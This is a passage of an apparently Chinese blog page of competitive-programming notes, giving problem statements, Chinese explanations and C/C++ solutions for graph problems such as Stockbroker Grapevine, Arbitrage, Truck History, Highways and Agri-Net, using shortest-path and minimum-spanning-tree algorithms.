minn=dis[j];</span><br><span class="line">            &#125;</span><br><span class="line">        vis[k]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=n; j++)</span><br><span class="line">            dis[j]=min(dis[j],max(dis[k],<span class="built_in">map</span>[k][j]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> q=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n)&amp;&amp;n)</span><br><span class="line">    &#123;</span><br><span class="line">        mem(<span class="built_in">map</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x[i],&amp;y[i]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>; j&lt;=n; j++)</span><br><span class="line">                <span class="built_in">map</span>[i][j]=<span class="built_in">map</span>[j][i]=<span class="built_in">sqrt</span>(<span class="type">double</span>(x[i]-x[j])*(x[i]-x[j])+<span class="type">double</span>(y[i]-y[j])*(y[i]-y[j]));</span><br><span class="line">        dj(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Scenario #%d\nFrog Distance = %.3lf\n\n&quot;</span>,q++,dis[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-Stockbroker-Grapevine"><a href="#7-Stockbroker-Grapevine" class="headerlink" title="7.Stockbroker Grapevine"></a>7.Stockbroker Grapevine</h3><p><strong>Description</strong></p>
<p>Stockbrokers are known to overreact to rumours. You have been contracted to develop a method of spreading disinformation amongst the stockbrokers to give your employer the tactical edge in the stock market. For maximum effect, you have to spread the rumours in the fastest possible way.</p>
<p>Unfortunately for you, stockbrokers only trust information coming from their “Trusted sources” This means you have to take into account the structure of their contacts when starting a rumour. It takes a certain amount of time for a specific stockbroker to pass the rumour on to each of his colleagues. Your task will be to write a program that tells you which stockbroker to choose as your starting point for the rumour, as well as the time it will take for the rumour to spread throughout the stockbroker community. This duration is measured as the time needed for the last person to receive the information.</p>
<p><strong>Input</strong></p>
<p>Your program will input data for different sets of stockbrokers. Each set starts with a line with the number of stockbrokers. Following this is a line for each stockbroker which contains the number of people who they have contact with, who these people are, and the time taken for them to pass the message to each person. The format of each stockbroker line is as follows: The line starts with the number of contacts (n), followed by n pairs of integers, one pair for each contact. Each pair lists first a number referring to the contact (e.g. a ‘1’ means person number one in the set), followed by the time in minutes taken to pass a message to that person. There are no special punctuation symbols or spacing rules.</p>
<p>Each person is numbered 1 through to the number of stockbrokers. The time taken to pass the message on will be between 1 and 10 minutes (inclusive), and the number of contacts will range between 0 and one less than the number of stockbrokers. The number of stockbrokers will range from 1 to 100. The input is terminated by a set of stockbrokers containing 0 (zero) people.</p>
<p><strong>Output</strong></p>
<p>For each set of data, your program must output a single line containing the person who results in the fastest message transmission, and how long before the last person will receive any given message after you give it to this person, measured in integer minutes.<br>It is possible that your program will receive a network of connections that excludes some persons, i.e. some people may be unreachable. If your program detects such a broken network, simply output the message “disjoint”. Note that the time taken to pass the message from person A to person B is not necessarily the same as the time taken to pass it from B to A, if such transmission is possible at all.</p>
<h5 id="分析：-3"><a href="#分析：-3" class="headerlink" title="分析："></a>分析：</h5><p>​    该题的输入第一行是股票经纪人的人数。接下来的一行包含每个经纪人可以联系的人的数量，这些人是谁，和他传递信息给每个人所花的时间。每一行的格式如下：最开始是可以联系的人的数目n，然后是n对整数，一对整数代表了他与一个联系人的情况。每一对整数的第一个数字是联系人的编号，第二个数字是指把消息传递给那个联系人所花的时间数。对于这个问题可以使用Bellman-Ford算法进行解决，最后查看邻接矩阵中最大的值就是传输的最长时间，也可以引入一个变量来记录最小值，来输出谁是最快的传输。  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 0x3fffffff</span></span><br><span class="line"><span class="type">int</span> <span class="built_in">map</span>[<span class="number">101</span>][<span class="number">101</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n,i,j,t,m,max,min;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n),n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">map</span>[i][i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;i;j++&#123;</span><br><span class="line">                <span class="built_in">map</span>[i][j] = <span class="built_in">map</span>[j][i]=MAX;<span class="comment">//初始化邻接矩阵</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">            <span class="keyword">while</span>(m--)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;j,&amp;t);</span><br><span class="line">                <span class="built_in">map</span>[i][j]=t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//填入加权值</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=n;++j)</span><br><span class="line">                <span class="keyword">for</span>(t=<span class="number">1</span>;t&lt;=n;++t)</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">map</span>[j][t]&gt;<span class="built_in">map</span>[j][i]+<span class="built_in">map</span>[i][t])</span><br><span class="line">                        <span class="built_in">map</span>[j][t]=<span class="built_in">map</span>[j][i]+<span class="built_in">map</span>[i][t];</span><br><span class="line">        min=MAX;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">        &#123;</span><br><span class="line">            max=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=n;++j)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(j==i)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">map</span>[i][j]&gt;max)</span><br><span class="line">                    max=<span class="built_in">map</span>[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(max&lt;min)</span><br><span class="line">            &#123;</span><br><span class="line">                min=max;</span><br><span class="line">                t=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(min==MAX)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;disjoint\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,t,min);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="8-Arbitrage"><a href="#8-Arbitrage" class="headerlink" title="8.Arbitrage"></a>8.Arbitrage</h3><p><strong>Description</strong></p>
<p>Arbitrage is the use of discrepancies in currency exchange rates to transform one unit of a currency into more than one unit of the same currency. For example, suppose that 1 US Dollar buys 0.5 British pound, 1 British pound buys 10.0 French francs, and 1 French franc buys 0.21 US dollar. Then, by converting currencies, a clever trader can start with 1 US dollar and buy 0.5 <em> 10.0 </em> 0.21 = 1.05 US dollars, making a profit of 5 percent.</p>
<p>Your job is to write a program that takes a list of currency exchange rates as input and then determines whether arbitrage is possible or not.</p>
<p><strong>Input</strong></p>
<p>he input will contain one or more test cases. Om the first line of each test case there is an integer n (1&lt;=n&lt;=30), representing the number of different currencies. The next n lines each contain the name of one currency. Within a name no spaces will appear. The next line contains one integer m, representing the length of the table to follow. The last m lines each contain the name ci of a source currency, a real number rij which represents the exchange rate from ci to cj and a name cj of the destination currency. Exchanges which do not appear in the table are impossible.<br>Test cases are separated from each other by a blank line. Input is terminated by a value of zero (0) for n.</p>
<p><strong>Output</strong></p>
<p>For each test case, print one line telling whether arbitrage is possible or not in the format “Case case: Yes” respectively “Case case: No”.</p>
<h5 id="分析：-4"><a href="#分析：-4" class="headerlink" title="分析："></a>分析：</h5><p>​    题目的意思是给你一些钱，看经过交换以后钱会不会变多。首先输入是n种不同的钱币，接下来的n行 是货币的名称。然后接下来的m行是不同钱币之间的转化关系，那么这个题我们也可以使用Bellman-Ford算法来找到哪种钱币最后能够盈利，对于字符串和编号之间的关系可以用map进行存储。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN=<span class="number">110</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXE=<span class="number">1100</span>;</span><br><span class="line"><span class="type">double</span> dist[MAXN];</span><br><span class="line"><span class="type">int</span> edge[MAXE][<span class="number">2</span>];</span><br><span class="line"><span class="type">double</span> d[MAXE];</span><br><span class="line"><span class="type">int</span> tol;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">bellman</span><span class="params">(<span class="type">int</span> start,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)dist[i]=<span class="number">0</span>;</span><br><span class="line">    dist[start]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">bool</span> flag=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;tol;j++)<span class="comment">//遍历所有的边</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> u=edge[j][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> v=edge[j][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(dist[v]&lt;dist[u]*d[j])</span><br><span class="line">            &#123;</span><br><span class="line">                flag=<span class="literal">true</span>;</span><br><span class="line">                dist[v]=dist[u]*d[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!flag)<span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//没有正环</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;tol;j++)</span><br><span class="line">      <span class="keyword">if</span>(dist[edge[j][<span class="number">1</span>]]&lt;dist[edge[j][<span class="number">0</span>]]*d[j])<span class="comment">//通过交换能够让钱数增加</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="type">int</span>&gt;mp;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;    </span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">string</span> str1,str2;</span><br><span class="line">    <span class="type">int</span> iCase=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n),n)</span><br><span class="line">    &#123;</span><br><span class="line">        iCase++;</span><br><span class="line">        mp.clear();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;str1;</span><br><span class="line">            mp[str1]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">        <span class="type">double</span> tmp;</span><br><span class="line">        tol=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(m--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;str1&gt;&gt;tmp&gt;&gt;str2;</span><br><span class="line">            edge[tol][<span class="number">0</span>]=mp[str1];</span><br><span class="line">            edge[tol][<span class="number">1</span>]=mp[str2];</span><br><span class="line">            d[tol++]=tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Case %d: &quot;</span>,iCase);</span><br><span class="line">        <span class="type">bool</span> flag=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(bellman(i,n))</span><br><span class="line">            &#123;</span><br><span class="line">                flag=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)<span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="9-Truck-History"><a href="#9-Truck-History" class="headerlink" title="9.Truck History"></a>9.Truck History</h3><p><strong>Description</strong></p>
<p>Advanced Cargo Movement, Ltd. uses trucks of different types. Some trucks are used for vegetable delivery, other for furniture, or for bricks. The company has its own code describing each type of a truck. The code is simply a string of exactly seven lowercase letters (each letter on each position has a very special meaning but that is unimportant for this task). At the beginning of company’s history, just a single truck type was used but later other types were derived from it, then from the new types another types were derived, and so on.</p>
<p>Today, ACM is rich enough to pay historians to study its history. One thing historians tried to find out is so called derivation plan — i.e. how the truck types were derived. They defined the distance of truck types as the number of positions with different letters in truck type codes. They also assumed that each truck type was derived from exactly one other truck type (except for the first truck type which was not derived from any other type). The quality of a derivation plan was then defined as<br><strong>1/Σ(to,td)d(to,td)</strong><br>where the sum goes over all pairs of types in the derivation plan such that to is the original type and td the type derived from it and d(to,td) is the distance of the types.<br>Since historians failed, you are to write a program to help them. Given the codes of truck types, your program should find the highest possible quality of a derivation plan.</p>
<p><strong>Input</strong></p>
<p>The input consists of several test cases. Each test case begins with a line containing the number of truck types, N, 2 &lt;= N &lt;= 2 000. Each of the following N lines of input contains one truck type code (a string of seven lowercase letters). You may assume that the codes uniquely describe the trucks, i.e., no two of these N lines are the same. The input is terminated with zero at the place of number of truck types.</p>
<p><strong>Output</strong></p>
<p>For each test case, your program should output the text “The highest possible quality is 1/Q.”, where 1/Q is the quality of the best derivation plan.</p>
<h5 id="分析：-5"><a href="#分析：-5" class="headerlink" title="分析："></a>分析：</h5><p>​    给出不同的字符串来代表不同的车，定义车之间的距离就是两个字符串之间不同字母的个数，题目要求的数不同的车之间距离的最小值，也就是求这些字符串之间表示的最小生成树，我们这里可以使用Prim算法进行求解。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//The maxmam truck type is 2000.</span></span><br><span class="line"><span class="type">char</span> str[<span class="number">2000</span>][<span class="number">8</span>];</span><br><span class="line"><span class="type">int</span> dis[<span class="number">2000</span>][<span class="number">2000</span>];</span><br><span class="line"><span class="type">int</span> lowdis[<span class="number">2000</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n),n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> i,j,k;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str[i]);</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="built_in">memset</span>(dis,<span class="number">0</span>,<span class="keyword">sizeof</span> dis);</span><br><span class="line">        <span class="comment">//求两个type之间的距离</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;<span class="number">7</span>;k++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(str[i][k]!=str[j][k])</span><br><span class="line">                        dis[i][j]++;</span><br><span class="line">                &#125;</span><br><span class="line">                dis[j][i]=dis[i][j];</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//初始化集合和颠倒集合的分类</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            lowdis[i]=dis[<span class="number">0</span>][i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            <span class="type">int</span> mindis = (<span class="number">1</span>&lt;&lt;<span class="number">20</span>);</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(lowdis[j]&amp;&amp;mindis&gt;lowdis[j])&#123;</span><br><span class="line">                    mindis = lowdis[j];</span><br><span class="line">                    k=j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ans += mindis;</span><br><span class="line">            lowdis[k] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(lowdis[j]&gt;dis[k][j])</span><br><span class="line">                lowdis[j]=dis[k][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;The highest possible quality is 1/&quot;</span>&lt;&lt;ans&lt;&lt;<span class="string">&quot;.&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="10-Highways"><a href="#10-Highways" class="headerlink" title="10.Highways"></a>10.Highways</h3><p><strong>Description</strong></p>
<p>The island nation of Flatopia is perfectly flat. Unfortunately, Flatopia has no public highways. So the traffic is difficult in Flatopia. The Flatopian government is aware of this problem. They’re planning to build some highways so that it will be possible to drive between any pair of towns without leaving the highway system.</p>
<p>Flatopian towns are numbered from 1 to N. Each highway connects exactly two towns. All highways follow straight lines. All highways can be used in both directions. Highways can freely cross each other, but a driver can only switch between highways at a town that is located at the end of both highways.</p>
<p>The Flatopian government wants to minimize the length of the longest highway to be built. However, they want to guarantee that every town is highway-reachable from every other town.</p>
<p><strong>Input</strong></p>
<p>The first line of input is an integer T, which tells how many test cases followed.<br>The first line of each case is an integer N (3 &lt;= N &lt;= 500), which is the number of villages. Then come N lines, the i-th of which contains N integers, and the j-th of these N integers is the distance (the distance should be an integer within [1, 65536]) between village i and village j. There is an empty line after each test case.</p>
<p><strong>Output</strong></p>
<p>For each test case, you should output a line contains an integer, which is the length of the longest road to be built such that all the villages are connected, and this value is minimum.</p>
<h5 id="分析：-6"><a href="#分析：-6" class="headerlink" title="分析："></a>分析：</h5><p>​    第一行是整数T，是测试数据的个数。每个测试数据的第一行都是一个整数N，表示小镇的数目。下面的N行，第i行包含N个整数，这N个整数表示小镇i到小镇j之间的距离。保证小镇之间的距离都是[1,65535]范围内的整数。对于每个测试数据，我们需要输出一个整数，表示小岛种两个小镇之间最长那条路的长度，要求是最长路最短。这个题显然是来直接进行最小生成树，然后计算出生成树中最长的路径长度。我们可以直接使用prim算法进行求解。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Max 502</span></span><br><span class="line"><span class="type">int</span> dis[Max];</span><br><span class="line"><span class="type">int</span> d[Max][Max];</span><br><span class="line"><span class="type">bool</span> visit[Max];</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> <span class="title function_">prim</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> v,max=<span class="number">0</span>,mini;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    dis[i] = d[<span class="number">0</span>][i];<span class="comment">//到第i个点的距离</span></span><br><span class="line">    visit[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//从中找出N-1条权值最小的边</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">        mini=<span class="number">100000</span>;</span><br><span class="line">        <span class="comment">//设置初始的最小值，visit向量用来记录是不是存储过边</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visit[i]==<span class="literal">false</span>&amp;&amp;mini&gt;dis[i])&#123;</span><br><span class="line">                mini = dis[i];</span><br><span class="line">                v=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        visit[v]=<span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//选择的边将访问向量设置为true</span></span><br><span class="line">        <span class="keyword">if</span>(max&lt;mini)</span><br><span class="line">        max = mini;</span><br><span class="line">        <span class="comment">//记录max记录，如果新加入的边的权值比较大，那么就保存下来</span></span><br><span class="line">        <span class="comment">//将新加入顶点的权值边进行更新操作 </span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visit[i]==<span class="literal">false</span>&amp;&amp;dis[i]&gt;d[v][i])&#123;</span><br><span class="line">                dis[i]=d[v][i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> t,i,j;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;t);</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(visit,<span class="literal">false</span>,<span class="keyword">sizeof</span> visit);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;d[i][j]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,prim());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="11-Agri-Net"><a href="#11-Agri-Net" class="headerlink" title="11.Agri-Net"></a>11.Agri-Net</h3><p><strong>Description</strong></p>
<p>Farmer John has been elected mayor of his town! One of his campaign promises was to bring internet connectivity to all farms in the area. He needs your help, of course.<br>Farmer John ordered a high speed connection for his farm and is going to share his connectivity with the other farmers. To minimize cost, he wants to lay the minimum amount of optical fiber to connect his farm to all the other farms.<br>Given a list of how much fiber it takes to connect each pair of farms, you must find the minimum amount of fiber needed to connect them all together. Each farm must connect to some other farm such that a packet can flow from any one farm to any other farm.<br>The distance between any two farms will not exceed 100,000.</p>
<p><strong>Input</strong></p>
<p>The input includes several cases. For each case, the first line contains the number of farms, N (3 &lt;= N &lt;= 100). The following lines contain the N x N conectivity matrix, where each element shows the distance from on farm to another. Logically, they are N lines of N space-separated integers. Physically, they are limited in length to 80 characters, so some lines continue onto others. Of course, the diagonal will be 0, since the distance from farm i to itself is not interesting for this problem.</p>
<p><strong>Output</strong></p>
<p>For each case, output a single integer length that is the sum of the minimum length of fiber required to connect the entire set of farms.</p>
<p>分析：本题是要在不同的农场之间来架设光纤，来使光纤的花费最小，这显然使用最小生成树算法来解决。Input包含不同的case，对每一种case都有N*N的连接矩阵，每一项代表农场之间相连的距离。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;numeric&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Max 105</span></span><br><span class="line"><span class="type">int</span> dis[Max];</span><br><span class="line"><span class="type">int</span> d[Max][Max];</span><br><span class="line"><span class="type">int</span> visit[Max];</span><br><span class="line"><span class="type">int</span> n,ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prim</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> mini,v;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    dis[i] = d[<span class="number">0</span>][i];</span><br><span class="line">    <span class="comment">//先选择一个顶点并初始化距离向量</span></span><br><span class="line">    visit[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">        mini = <span class="number">1e5</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visit[i]==<span class="literal">false</span>&amp;&amp;dis[i]&lt;mini)&#123;</span><br><span class="line">                mini = dis[i];</span><br><span class="line">                v = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ans += mini;</span><br><span class="line">        visit[v] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span 